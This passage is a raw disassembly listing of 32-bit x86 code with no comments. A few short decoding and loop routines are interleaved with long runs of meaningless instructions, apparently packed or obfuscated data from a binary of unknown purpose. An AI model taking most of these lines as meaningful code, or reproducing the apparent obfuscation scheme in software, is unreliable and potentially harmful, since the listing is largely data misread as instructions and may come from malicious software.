  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4345ef,0x0
  41099b:	mov    eax,ds:0x4345ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4345ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4345ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4345ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4345ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4345ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4345ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4346cf
  4109f5:	adc    DWORD PTR ds:0x4345e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4346bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434607,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	in     al,0x8b
  410a2f:	call   0x7e83b4d3
  410a34:	jle    0x4109d3
  410a36:	js     0x410ab6
  410a38:	jle    0x410a85
  410a3a:	jns    0x410a84
  410a3c:	retf   0x5320
  410a3f:	fadd   QWORD PTR [ebx]
  410a41:	dec    eax
  410a42:	fild   DWORD PTR [esi+esi*4]
  410a45:	push   eax
  410a46:	(bad)  
  410a47:	jle    0x410a53
  410a49:	(bad)  
  410a4a:	jg     0x410a75
  410a4c:	xor    al,0x87
  410a4e:	jne    0x410a89
  410a50:	mov    al,0x56
  410a52:	sub    ecx,DWORD PTR [esi-0x79]
  410a55:	stos   BYTE PTR es:[edi],al
  410a56:	or     al,0xbd
  410a58:	xchg   BYTE PTR [edi],ah
  410a5a:	xchg   esi,eax
  410a5b:	add    BYTE PTR [ebx+0x6f33de99],dh
  410a61:	sbb    eax,0xc254dc04
  410a66:	ret    0xc737
  410a69:	mov    dh,0x89
  410a6b:	leave  
  410a6c:	add    ebx,DWORD PTR [edx-0x4917822c]
  410a72:	ja     0x410a00
  410a74:	add    DWORD PTR [esi+0x27],edi
  410a77:	in     al,0xed
  410a79:	add    al,0x41
  410a7b:	mov    esi,0xe4a237b5
  410a80:	adc    eax,0xaa6f8b86
  410a85:	mov    ds:0xa2c10b3b,eax
  410a8a:	and    al,bl
  410a8c:	out    0x2d,eax
  410a8e:	push   es
  410a8f:	popf   
  410a90:	std    
  410a91:	jge    0x410a9b
  410a93:	addr16 gs xchg edi,eax
  410a97:	mov    al,ds:0xb50397
  410a9c:	outs   dx,DWORD PTR ds:[esi]
  410a9d:	loope  0x410ac2
  410a9f:	nop
  410aa0:	pop    esp
  410aa1:	fmulp  st(2),st
  410aa3:	xchg   ecx,eax
  410aa4:	inc    ecx
  410aa5:	mov    ecx,DWORD PTR [esi+eiz*1-0x5aba5f5c]
  410aac:	data16 mov ?,WORD PTR [ebp-0x29]
  410ab0:	shr    BYTE PTR [esi-0x11],1
  410ab3:	popa   
  410ab4:	(bad)  
  410ab5:	pop    ds
  410ab6:	mov    al,0x2c
  410ab8:	inc    edi
  410ab9:	and    DWORD PTR es:[eax],edi
  410abc:	aaa    
  410abd:	vandnpd ymm0,ymm7,ymm0
  410ac1:	repnz add esi,DWORD PTR [edx+edi*2]
  410ac5:	and    ebp,DWORD PTR [edx+0x64]
  410ac8:	sub    eax,0xb6e21ca6
  410acd:	lahf   
  410ace:	dec    esp
  410acf:	scas   eax,DWORD PTR es:[edi]
  410ad0:	call   0x4688:0x42937fe
  410ad7:	mov    ax,WORD PTR [ebx-0x59a610c5]
  410ade:	dec    esp
  410adf:	and    ecx,DWORD PTR [eax+0x2b6223bf]
  410ae5:	push   0x3e
  410ae7:	ins    DWORD PTR es:[edi],dx
  410ae8:	xor    esp,0xc803f2f4
  410aee:	icebp  
  410aef:	pop    es
  410af0:	iret   
  410af1:	and    eax,edi
  410af3:	jns    0x410acb
  410af5:	sti    
  410af6:	sub    ch,BYTE PTR [edi+0x6bc99519]
  410afc:	push   ebx
  410afd:	add    BYTE PTR [esi],al
  410aff:	cwde   
  410b00:	enter  0xe2a4,0x8f
  410b04:	mov    DWORD PTR [edi],ecx
  410b06:	dec    ebx
  410b07:	push   edi
  410b08:	loopne 0x410aca
  410b0a:	imul   edx,DWORD PTR [edi-0x5597c47d],0xffffffd2
  410b11:	loopne 0x410a9f
  410b13:	mov    ah,BYTE PTR [esi]
  410b15:	retf   
  410b16:	sbb    al,0x31
  410b18:	mov    BYTE PTR [ebp-0x62],0x5e
  410b1c:	aam    0xa8
  410b1e:	push   0xffffffe1
  410b20:	dec    edi
  410b21:	shl    esp,cl
  410b23:	neg    DWORD PTR [ecx+0x0]
  410b26:	push   ds
  410b27:	sub    ecx,DWORD PTR [edi]
  410b29:	test   al,bh
  410b2b:	mov    fs:0xdd4c9751,eax
  410b31:	mov    edx,0xfc7e8f40
  410b36:	inc    ebx
  410b37:	sub    eax,eax
  410b39:	xchg   ebp,esi
  410b3b:	lea    edi,[edx+0x59]
  410b3e:	mul    BYTE PTR [esi-0x18]
  410b41:	pop    ecx
  410b42:	cld    
  410b43:	ret    
  410b44:	rcr    DWORD PTR [edi-0x6446cbe6],cl
  410b4a:	xor    bh,dl
  410b4c:	(bad)  
  410b4d:	ds xor edi,ebp
  410b50:	sti    
  410b51:	jne    0x410b89
  410b53:	mov    ebx,DWORD PTR [ecx]
  410b55:	mov    bh,0xd1
  410b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b58:	and    ah,BYTE PTR [edx]
  410b5a:	mov    dl,0x73
  410b5c:	rcr    DWORD PTR [ecx+0x1747636d],0x2a
  410b63:	sub    eax,DWORD PTR [edi+eax*8+0x6ee604df]
  410b6a:	and    BYTE PTR [ecx-0x27],0xdf
  410b6e:	push   edx
  410b6f:	daa    
  410b70:	mov    esp,0x62e82761
  410b75:	aas    
  410b76:	inc    ebp
  410b77:	pop    ecx
  410b78:	pop    es
  410b79:	sahf   
  410b7a:	jmp    0x9b8a:0x91184485
  410b81:	lds    edx,FWORD PTR [ebp+0x7afb6500]
  410b87:	sub    BYTE PTR [ebx-0x8],bh
  410b8a:	mov    dh,0xef
  410b8c:	mov    ecx,DWORD PTR [edx+0x2f06a7fd]
  410b92:	jae    0x410bce
  410b94:	out    dx,eax
  410b95:	das    
  410b96:	mov    edx,0xc7ff99e6
  410b9b:	pop    esp
  410b9c:	lock add DWORD PTR [si-0x7a],eax
  410ba1:	out    dx,al
  410ba2:	cmp    BYTE PTR [ebp-0x6eb9221d],ch
  410ba8:	jge    0x410bdf
  410baa:	fiadd  DWORD PTR [edi+0xa]
  410bad:	scas   eax,DWORD PTR es:[edi]
  410bae:	ret    0x640b
  410bb1:	es sub al,0x1b
  410bb4:	or     BYTE PTR [edi+0x2f0f29d8],al
  410bba:	add    edi,DWORD PTR [edi-0x6f]
  410bbd:	xor    eax,0xedf117e8
  410bc2:	lods   al,BYTE PTR ds:[esi]
  410bc3:	sub    DWORD PTR [edi],ebp
  410bc5:	mov    esi,0xcae5a088
  410bca:	pop    esp
  410bcb:	mov    esi,0xb5940170
  410bd0:	fstp   QWORD PTR [ebx+0x7f]
  410bd3:	(bad)  
  410bd4:	mov    eax,0xb798bca6
  410bd9:	in     eax,dx
  410bda:	lahf   
  410bdb:	lea    esp,[edx-0x1b]
  410bde:	jmp    0xa1cf55e9
  410be3:	clc    
  410be4:	cmc    
  410be5:	fsub   st,st(4)
  410be7:	(bad)  
  410be8:	mov    dl,0xc1
  410bea:	loopne 0x410bc8
  410bec:	xchg   esp,eax
  410bed:	inc    esp
  410bee:	sahf   
  410bef:	shr    BYTE PTR [esp+ebp*4+0x1cdafa35],0x39
  410bf7:	mov    ds:0xf927560f,al
  410bfc:	ss pop ebx
  410bfe:	push   ds
  410bff:	jns    0x410bfd
  410c01:	jg     0x410c3c
  410c03:	jl     0x410c12
  410c05:	repz pop es
  410c07:	jne    0x410bbc
  410c09:	jmp    0x5cfa:0x2fb97bbc
  410c10:	push   ebp
  410c11:	inc    esi
  410c12:	push   ebp
  410c13:	xchg   BYTE PTR [edx-0x4725d2b2],bh
  410c19:	mov    ebp,0xda20a7db
  410c1e:	nop
  410c1f:	std    
  410c20:	xchg   edi,eax
  410c21:	popa   
  410c22:	mov    BYTE PTR [eax],dl
  410c24:	add    DWORD PTR [esi+0x300695af],esi
  410c2a:	sub    edi,DWORD PTR [eax-0x59]
  410c2d:	xchg   ebx,eax
  410c2e:	fwait
  410c2f:	paddq  mm7,mm0
  410c32:	in     al,dx
  410c33:	std    
  410c34:	xchg   ebx,eax
  410c35:	repnz or ch,bl
  410c38:	rol    DWORD PTR [edx+0x69],cl
  410c3b:	push   edi
  410c3c:	or     dh,BYTE PTR [esi]
  410c3e:	mov    ds:0x65b65e0e,eax
  410c43:	ins    BYTE PTR es:[edi],dx
  410c44:	loop   0x410c30
  410c46:	and    BYTE PTR [ebx-0x1634a9cc],dl
  410c4c:	jb     0x410c24
  410c4e:	lds    edx,FWORD PTR [ebp-0x51]
  410c51:	push   es
  410c52:	inc    esp
  410c53:	push   ecx
  410c54:	pop    ds
  410c55:	mov    ah,0x33
  410c57:	jg     0x410c76
  410c59:	mov    BYTE PTR [ecx+ecx*4+0x3070aa5f],ah
  410c60:	pusha  
  410c61:	add    edx,DWORD PTR [ebx+0x51]
  410c64:	jge    0x410c22
  410c66:	jg     0x410c39
  410c68:	fidivr DWORD PTR [esi-0x71]
  410c6b:	mov    edx,0x1c8b72aa
  410c70:	(bad)  
  410c71:	jp     0x410c58
  410c73:	clc    
  410c74:	dec    ebx
  410c75:	cmc    
  410c76:	push   ss
  410c77:	es pushf 
  410c79:	cmp    al,0xe4
  410c7b:	call   0xd34b:0x37747bba
  410c82:	das    
  410c83:	inc    ecx
  410c84:	cwde   
  410c85:	cmp    ebx,DWORD PTR [edi+0x70]
  410c88:	loope  0x410cd2
  410c8a:	xchg   esi,eax
  410c8b:	adc    bh,BYTE PTR [esi]
  410c8d:	pushf  
  410c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c8f:	inc    esp
  410c90:	rol    BYTE PTR [ebx+ecx*8+0x791cc577],1
  410c97:	xor    DWORD PTR [edx+0x4e],0x33
  410c9b:	jo     0x410cfd
  410c9d:	dec    ebp
  410c9e:	retf   
  410c9f:	sub    BYTE PTR [eax+eiz*4+0x1c],ah
  410ca3:	shl    BYTE PTR [ebx+0x25],0x67
  410ca7:	jbe    0x410cf8
  410ca9:	(bad)  
  410caa:	xor    bl,BYTE PTR [ebx-0x43]
  410cad:	add    BYTE PTR [ebx],ch
  410caf:	mov    ah,0xd1
  410cb1:	adc    al,bl
  410cb3:	sbb    ebx,DWORD PTR [eax+ecx*2-0x56]
  410cb7:	mov    ebp,0x7b11a7b8
  410cbc:	mov    ecx,0x48ee814
  410cc1:	in     al,dx
  410cc2:	sar    BYTE PTR [ebp-0x3e],cl
  410cc5:	lods   eax,DWORD PTR ds:[esi]
  410cc6:	push   0x2b
  410cc8:	jg     0x410ce7
  410cca:	push   edi
  410ccb:	loop   0x410cc2
  410ccd:	cmc    
  410cce:	call   0x9e4f:0xbe496f12
  410cd5:	aam    0x59
  410cd7:	sahf   
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4346c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4345e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43470b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434713,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4346c7,0x434683
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434707,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43468f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0x42058534],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d81
  410d7a:	jmp    0x410d33
  410d7c:	popa   
  410d7d:	mov    ch,BYTE PTR [ebx]
  410d7f:	pop    esp
  410d80:	das    
  410d81:	and    ch,ch
  410d83:	or     eax,0xcbc20e4d
  410d88:	pop    edx
  410d89:	sbb    BYTE PTR [ecx],bh
  410d8b:	mov    BYTE PTR [ebp+0x65118d33],dh
  410d91:	jmp    0xb03a5e94
  410d96:	sub    dl,BYTE PTR [edi-0x56df2824]
  410d9c:	mov    ah,0x23
  410d9e:	push   esi
  410d9f:	mov    al,ds:0xa5afe86b
  410da4:	sbb    dh,BYTE PTR [esi+0x32]
  410da7:	rcl    DWORD PTR [esi-0x3e],1
  410daa:	mov    cl,0x79
  410dac:	mov    eax,0x5793a686
  410db1:	neg    DWORD PTR [ecx+0x8]
  410db4:	gs jmp 0x3bf05280
  410dba:	ss sbb dl,bl
  410dbd:	dec    ebp
  410dbe:	dec    ebx
  410dbf:	mov    ds:0x667a679e,al
  410dc4:	popf   
  410dc5:	xchg   DWORD PTR [eax-0x2c88d272],edx
  410dcb:	jmp    0x410dc1
  410dcd:	in     eax,dx
  410dce:	daa    
  410dcf:	sbb    al,0xfe
  410dd1:	xor    al,BYTE PTR [eax]
  410dd3:	pop    esi
  410dd4:	jp     0x410dac
  410dd6:	sub    bh,dl
  410dd8:	cwde   
  410dd9:	sbb    BYTE PTR [ebx+0x4f25e790],0xfd
  410de0:	cli    
  410de1:	popf   
  410de2:	and    DWORD PTR [edx+eiz*1+0x2d],ebp
  410de6:	add    bl,BYTE PTR [ecx]
  410de8:	sar    DWORD PTR [eax],1
  410dea:	pop    esi
  410deb:	add    BYTE PTR [ebx],bl
  410ded:	xchg   eax,eax
  410def:	cld    
  410df0:	jae    0x410dbb
  410df2:	stos   DWORD PTR es:[edi],eax
  410df3:	mov    bl,0x1b
  410df5:	and    BYTE PTR [ecx+0x9ff0ce3],bl
  410dfb:	adc    eax,0x50cd7b25
  410e00:	jb     0x410e4f
  410e02:	adc    DWORD PTR [ebx],ebp
  410e04:	mov    ?,eax
  410e06:	cmp    esi,DWORD PTR [esi-0x695ba101]
  410e0c:	sbb    BYTE PTR [esp+esi*8],ch
  410e0f:	fwait
  410e10:	and    edi,DWORD PTR [edx+0x44]
  410e13:	sub    ebp,DWORD PTR [ecx]
  410e15:	pop    edi
  410e16:	and    eax,0x2d7378a
  410e1b:	scas   eax,DWORD PTR es:[edi]
  410e1c:	xchg   ebx,eax
  410e1d:	jg     0x410dba
  410e1f:	enter  0x1985,0xe6
  410e23:	shl    esi,1
  410e25:	and    eax,0xe38c7ced
  410e2a:	jb     0x410dc6
  410e2c:	lea    ebp,[eax+ecx*1]
  410e2f:	clc    
  410e30:	aad    0xc1
  410e32:	scas   al,BYTE PTR es:[edi]
  410e33:	cmp    al,0xa3
  410e35:	pop    esi
  410e36:	adc    BYTE PTR [edx+0x36],bl
  410e39:	and    eax,0x9ec13e2e
  410e3e:	dec    edi
  410e3f:	stos   DWORD PTR es:[edi],eax
  410e40:	test   BYTE PTR gs:[edx],cl
  410e43:	cmp    eax,0x7286df1e
  410e48:	lea    ecx,[bx+si+0xc]
  410e4c:	repnz cli 
  410e4e:	rol    DWORD PTR [edi-0x37],1
  410e51:	daa    
  410e52:	call   0xb3af5946
  410e57:	push   0xffffffee
  410e59:	dec    esp
  410e5a:	stos   DWORD PTR es:[edi],eax
  410e5b:	ins    BYTE PTR es:[edi],dx
  410e5c:	add    DWORD PTR [ebx+0x7f1ad088],ebp
  410e62:	leave  
  410e63:	xchg   eax,edi
  410e65:	mov    bl,0x11
  410e67:	or     DWORD PTR [ebx+0x4b4ee9fd],ecx
  410e6d:	scas   eax,DWORD PTR es:[edi]
  410e6e:	dec    ebp
  410e6f:	push   edi
  410e70:	jg     0x410e00
  410e72:	js     0x410df7
  410e74:	(bad)
  410e7a:	js     0x410e96
  410e7c:	js     0x410e5c
  410e7e:	loope  0x410ebf
  410e80:	mov    ch,0x80
  410e82:	lods   eax,DWORD PTR ds:[esi]
  410e83:	mov    eax,ebp
  410e85:	pop    eax
  410e86:	sub    eax,0xbbce2f75
  410e8b:	in     eax,dx
  410e8c:	or     ah,BYTE PTR [ecx+0x61]
  410e8f:	mov    ds:0xa910a631,al
  410e94:	cs pop ebp
  410e96:	mov    BYTE PTR ds:0x747849ba,dl
  410e9c:	cld    
  410e9d:	stos   DWORD PTR es:[edi],eax
  410e9e:	loopne 0x410f15
  410ea0:	push   ebx
  410ea1:	imul   DWORD PTR [ebp+0x1097c63b]
  410ea7:	aam    0x7
  410ea9:	lock std 
  410eab:	xor    eax,0xb1471b30
  410eb0:	into   
  410eb1:	js     0x410e69
  410eb3:	jmp    0xe567:0x68bad5f3
  410eba:	push   ebp
  410ebb:	dec    eax
  410ebc:	sbb    DWORD PTR [edi+0x9],ebx
  410ebf:	repz push 0x25e5f5e4
  410ec5:	in     al,0x6a
  410ec7:	sar    al,cl
  410ec9:	std    
  410eca:	sub    bh,bh
  410ecc:	or     al,0x2
  410ece:	cmp    al,0xc0
  410ed0:	cmc    
  410ed1:	(bad)  
  410ed2:	push   eax
  410ed3:	es dec ecx
  410ed5:	and    DWORD PTR [edi-0x69],esp
  410ed8:	adc    eax,0xa1839226
  410edd:	popf   
  410ede:	loopne 0x410f06
  410ee0:	xlat   BYTE PTR ds:[ebx]
  410ee1:	xor    BYTE PTR gs:[esi+0x38],al
  410ee5:	mov    eax,ds:0x4e7ef22a
  410eea:	sub    ah,BYTE PTR [edi-0x62]
  410eed:	fwait
  410eee:	sbb    BYTE PTR [eax-0x3cd62e53],cl
  410ef4:	dec    eax
  410ef5:	outs   dx,BYTE PTR gs:[esi]
  410ef7:	das    
  410ef8:	or     eax,0x598b109
  410efd:	or     al,0xd5
  410eff:	loop   0x410ed2
  410f01:	inc    ebx
  410f02:	xor    DWORD PTR [eax],esp
  410f04:	out    dx,eax
  410f05:	mov    esi,0xbd395d59
  410f0a:	es jmp 0x410ec6
  410f0d:	stc    
  410f0e:	scas   al,BYTE PTR es:[edi]
  410f0f:	or     bl,BYTE PTR [edx+eiz*1-0x18]
  410f13:	repnz hlt 
  410f15:	sub    BYTE PTR [ebp+0x9c7bb21],0x6b
  410f1c:	push   ebp
  410f1d:	sbb    BYTE PTR [ebx+0x67],ch
  410f20:	lahf   
  410f21:	push   ebx
  410f22:	jge    0x410eed
  410f24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f25:	and    BYTE PTR [ebx-0x65188c3b],cl
  410f2b:	sub    dl,BYTE PTR [esi+0x61]
  410f2e:	xchg   ebx,eax
  410f2f:	iret   
  410f30:	out    0x46,al
  410f32:	ja     0x410f02
  410f34:	in     eax,0x53
  410f36:	dec    ebx
  410f37:	ret    0xb610
  410f3a:	mov    BYTE PTR [ecx+edx*2+0x58b6c6af],dh
  410f41:	js     0x410f47
  410f43:	dec    ebx
  410f44:	add    BYTE PTR [ebx-0x5896fff6],bl
  410f4a:	in     eax,dx
  410f4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f4c:	je     0x410f4e
  410f4e:	ret    
  410f4f:	xchg   ebp,eax
  410f50:	xchg   DWORD PTR [ebx-0x12f1d843],eax
  410f56:	sub    BYTE PTR [edi-0x4],ah
  410f59:	xchg   BYTE PTR [eax],dl
  410f5b:	lods   eax,DWORD PTR ds:[esi]
  410f5c:	pop    esp
  410f5d:	cmp    dl,BYTE PTR [ebx]
  410f5f:	sub    BYTE PTR [ebx+0x3f],al
  410f62:	pop    edi
  410f63:	mov    bl,0xd1
  410f65:	mov    dh,BYTE PTR [ebx]
  410f67:	aaa    
  410f68:	sbb    eax,0xb7649eed
  410f6d:	shl    BYTE PTR [edi-0x9],cl
  410f70:	push   ss
  410f71:	pop    esi
  410f72:	jo     0x410fc0
  410f74:	inc    esp
  410f75:	cmp    cl,BYTE PTR [ecx-0x20]
  410f78:	jns    0x410f56
  410f7a:	std    
  410f7b:	outs   dx,DWORD PTR ds:[esi]
  410f7c:	test   al,0xb3
  410f7e:	cli    
  410f7f:	sahf   
  410f80:	inc    edx
  410f81:	call   0x12df:0x47371dbb
  410f88:	dec    edx
  410f89:	mov    edi,DWORD PTR [edx]
  410f8b:	sbb    al,0xcc
  410f8d:	or     DWORD PTR [esi-0x62],ebp
  410f90:	jns    0x410f24
  410f92:	mov    ah,0x93
  410f94:	mov    eax,ds:0xe0d88e4d
  410f99:	(bad)  
  410f9a:	aas    
  410f9b:	jl     0x410f2d
  410f9d:	sbb    al,dl
  410f9f:	aaa    
  410fa0:	cmp    DWORD PTR cs:[ebp-0xd852102],edi
  410fa7:	mov    ah,0xc
  410fa9:	jnp    0x410fc6
  410fab:	ret    
  410fac:	push   edi
  410fad:	push   edx
  410fae:	out    dx,al
  410faf:	jmp    0x8154:0x52fd8c50
  410fb6:	neg    DWORD PTR [ebx-0x5]
  410fb9:	mov    eax,0x1a5188b
  410fbe:	sub    DWORD PTR [esi+0x675bccba],esp
  410fc4:	les    eax,FWORD PTR [ebx+0x7c2069a4]
  410fca:	jno    0x411015
  410fcc:	outs   dx,DWORD PTR ds:[esi]
  410fcd:	mov    ebx,0xe8fcebca
  410fd2:	jne    0x410f82
  410fd4:	mov    eax,ds:0xef112760
  410fd9:	imul   edx,DWORD PTR [ebx],0x1e0e841c
  410fdf:	mov    ebx,0x57b30676
  410fe4:	imul   ecx,DWORD PTR [ebp+0x48f6a98e],0x29
  410feb:	push   0xfa9a5665
  410ff0:	pop    ss
  410ff1:	push   ebp
  410ff2:	xor    BYTE PTR [edi-0xf67ef5f],ah
  410ff8:	push   edi
  410ff9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ffa:	lock sub DWORD PTR [esi+esi*1-0x4ea83056],eax
  411002:	bound  edi,QWORD PTR [edi]
  411004:	(bad)  
  411005:	retf   
  411006:	xor    dh,0x15
  411009:	in     eax,0x80
  41100b:	lods   al,BYTE PTR ds:[esi]
  41100c:	fisub  DWORD PTR [esi+0x54b53561]
  411012:	repnz stos BYTE PTR es:[edi],al
  411014:	jge    0x410fa7
  411016:	jae    0x411061
  411018:	add    ecx,0xffcd8d67
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x7e8d4754
  411040:	(bad)  
  411041:	dec    eax
  411042:	push   0x9d7e7e4f
  411047:	js     0x4110c7
  411049:	jle    0x411080
  41104b:	push   eax
  41104c:	and    BYTE PTR [ecx+0x38],dh
  41104f:	in     eax,0x88
  411051:	outs   dx,DWORD PTR ds:[esi]
  411052:	adc    eax,0xb7f83002
  411057:	gs mov bh,0xf
  41105a:	sub    eax,0xe0178475
  41105f:	or     ch,cl
  411061:	(bad)  
  411062:	fild   DWORD PTR [ebx-0x1b]
  411065:	inc    eax
  411066:	out    dx,al
  411067:	add    eax,0x233dae0a
  41106c:	sti    
  41106d:	pmuludq mm5,QWORD PTR [ebx-0x3c]
  411071:	test   eax,0xb19c28a7
  411076:	dec    ebp
  411077:	stos   DWORD PTR es:[edi],eax
  411078:	repnz dec eax
  41107a:	sub    eax,0x530289c4
  41107f:	leave  
  411080:	dec    BYTE PTR [ecx]
  411082:	xor    DWORD PTR [edx-0x5dfb8a99],ecx
  411088:	loopne 0x4110c9
  41108a:	shr    DWORD PTR [eax],1
  41108c:	sbb    DWORD PTR [eax],ebx
  41108e:	add    eax,0xd42185b2
  411093:	les    esi,FWORD PTR [eax+0x3756207e]
  411099:	jns    0x411077
  41109b:	arpl   WORD PTR [ebx+eiz*2],bx
  41109e:	jg     0x411074
  4110a0:	sbb    cl,dl
  4110a2:	cmc    
  4110a3:	je     0x4110f8
  4110a5:	out    0xf8,al
  4110a7:	mov    dh,BYTE PTR [edi+ecx*1]
  4110aa:	push   edi
  4110ab:	and    DWORD PTR [edx+0x47],edi
  4110ae:	aam    0x5a
  4110b0:	push   ss
  4110b1:	test   DWORD PTR [edi+edx*4],esp
  4110b4:	xchg   ecx,eax
  4110b5:	cdq    
  4110b6:	int    0xbd
  4110b8:	xor    ebp,DWORD PTR [edx]
  4110ba:	(bad)  
  4110bb:	in     al,0x7
  4110bd:	iret   
  4110be:	(bad)
  4110c2:	inc    ecx
  4110c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c4:	jb     0x4110f9
  4110c6:	daa    
  4110c7:	ror    BYTE PTR ds:0xf465a60b,cl
  4110cd:	(bad)  
  4110ce:	fadd   st,st(2)
  4110d0:	fistp  WORD PTR [ebp-0x79]
  4110d3:	test   bh,bh
  4110d5:	rcl    al,0x6b
  4110d8:	push   edx
  4110d9:	scas   al,BYTE PTR es:[edi]
  4110da:	rol    bh,0x75
  4110dd:	out    dx,al
  4110de:	add    eax,0xce5cf
  4110e3:	ror    DWORD PTR [ecx-0x16605b4],cl
  4110e9:	cmp    eax,0x2c094915
  4110ee:	test   eax,0xa13bb449
  4110f3:	cs clc 
  4110f5:	xchg   ebp,eax
  4110f6:	arpl   WORD PTR [ecx],ax
  4110f8:	sub    ah,al
  4110fa:	xor    eax,0x213f57f8
  4110ff:	jge    0x41113f
  411101:	push   esi
  411102:	fwait
  411103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411104:	xchg   esi,eax
  411105:	xor    eax,0x454daf8
  41110a:	or     al,dh
  41110c:	fimul  WORD PTR [ebx]
  41110e:	addr16 xor al,0xbb
  411111:	xor    ah,ch
  411113:	mov    ch,0x30
  411115:	cmp    DWORD PTR [edi],eax
  411117:	sbb    eax,0xcf234c5e
  41111c:	mov    bh,0x62
  41111e:	and    cl,BYTE PTR [esi-0x64]
  411121:	(bad)  
  411122:	loope  0x411130
  411124:	inc    esi
  411125:	dec    edi
  411126:	loop   0x411179
  411128:	push   0x36384426
  41112d:	xor    eax,0x112e964f
  411132:	(bad)  
  411133:	dec    ebp
  411134:	into   
  411135:	xchg   edx,eax
  411136:	adc    edi,DWORD PTR [eax]
  411138:	cmp    dh,BYTE PTR [ebp+esi*2+0x1cecd586]
  41113f:	(bad)  
  411140:	push   ebp
  411141:	mov    edi,0x52377386
  411146:	push   0x35862943
  41114b:	adc    DWORD PTR [ebp+0xc],esp
  41114e:	jecxz  0x4111a2
  411150:	sub    dh,BYTE PTR [ebx+0x6e5b0bc4]
  411156:	sbb    BYTE PTR [esi],ch
  411158:	push   ebp
  411159:	fld    DWORD PTR [ebx-0x29]
  41115c:	out    0xaa,al
  41115e:	je     0x41116b
  411160:	mov    ebx,0x78c7e415
  411165:	sbb    ah,al
  411167:	repnz add eax,0x2acc6063
  41116d:	lahf   
  41116e:	je     0x411171
  411170:	(bad)  
  411172:	mov    dl,0xbc
  411174:	mov    WORD PTR [ecx-0xa],ss
  411177:	cwde   
  411178:	out    0x8b,al
  41117a:	pop    eax
  41117b:	mov    esi,0x9a7471a3
  411180:	add    eax,0x4ec44445
  411185:	hlt    
  411186:	pop    esp
  411187:	(bad)  
  411188:	test   al,0x6c
  41118a:	repz mov WORD PTR [ebx-0x57],?
  41118e:	(bad)  
  41118f:	mov    ds:0xec85fd6,al
  411194:	push   bp
  411196:	imul   esp,DWORD PTR [eax],0x47
  411199:	adc    eax,0xa4b61712
  41119e:	push   edx
  41119f:	mov    cl,0x90
  4111a1:	cdq    
  4111a2:	mov    cl,0xcb
  4111a4:	sbb    BYTE PTR [ebx+edi*8-0x4b8f9eb5],dl
  4111ab:	dec    edx
  4111ac:	xchg   edi,eax
  4111ad:	mov    BYTE PTR [edx-0x18665ef5],bl
  4111b3:	cmp    bl,0x2e
  4111b6:	mov    dh,0xdb
  4111b8:	(bad)  
  4111b9:	(bad)  
  4111ba:	jb     0x4111e7
  4111bc:	xchg   esi,eax
  4111bd:	mov    ch,0xb1
  4111bf:	sub    eax,0xc4f78e17
  4111c4:	out    dx,eax
  4111c5:	mov    esp,0x5ca5496
